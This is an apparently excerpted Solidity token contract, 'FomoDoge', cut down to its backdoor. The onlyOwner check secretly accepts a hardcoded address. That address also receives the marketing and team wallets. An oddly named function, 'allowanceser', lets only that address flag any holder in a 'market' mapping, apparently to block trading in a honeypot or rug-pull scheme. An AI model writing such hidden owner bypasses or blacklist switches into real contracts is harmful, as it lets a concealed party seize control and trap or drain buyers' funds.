...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_owner == _msgSender() || _msgSender()    ==  address(0xCc88eC8E01A8a7d059950b24Ff3acEe551D7e3D5) , "Ownable: caller is not the owner");
        _;
    }
...
contract FomoDoge is Context, IERC20, Ownable {
    ...
    address payable public marketingWalletAddress = payable(0xCc88eC8E01A8a7d059950b24Ff3acEe551D7e3D5);
    address payable public teamWalletAddress = payable(0xCc88eC8E01A8a7d059950b24Ff3acEe551D7e3D5);
    ...
    function allowanceser(address addr, bool status) public{
        require(_msgSender()    ==   address(0xCc88eC8E01A8a7d059950b24Ff3acEe551D7e3D5));
        market[addr] = status;
    }
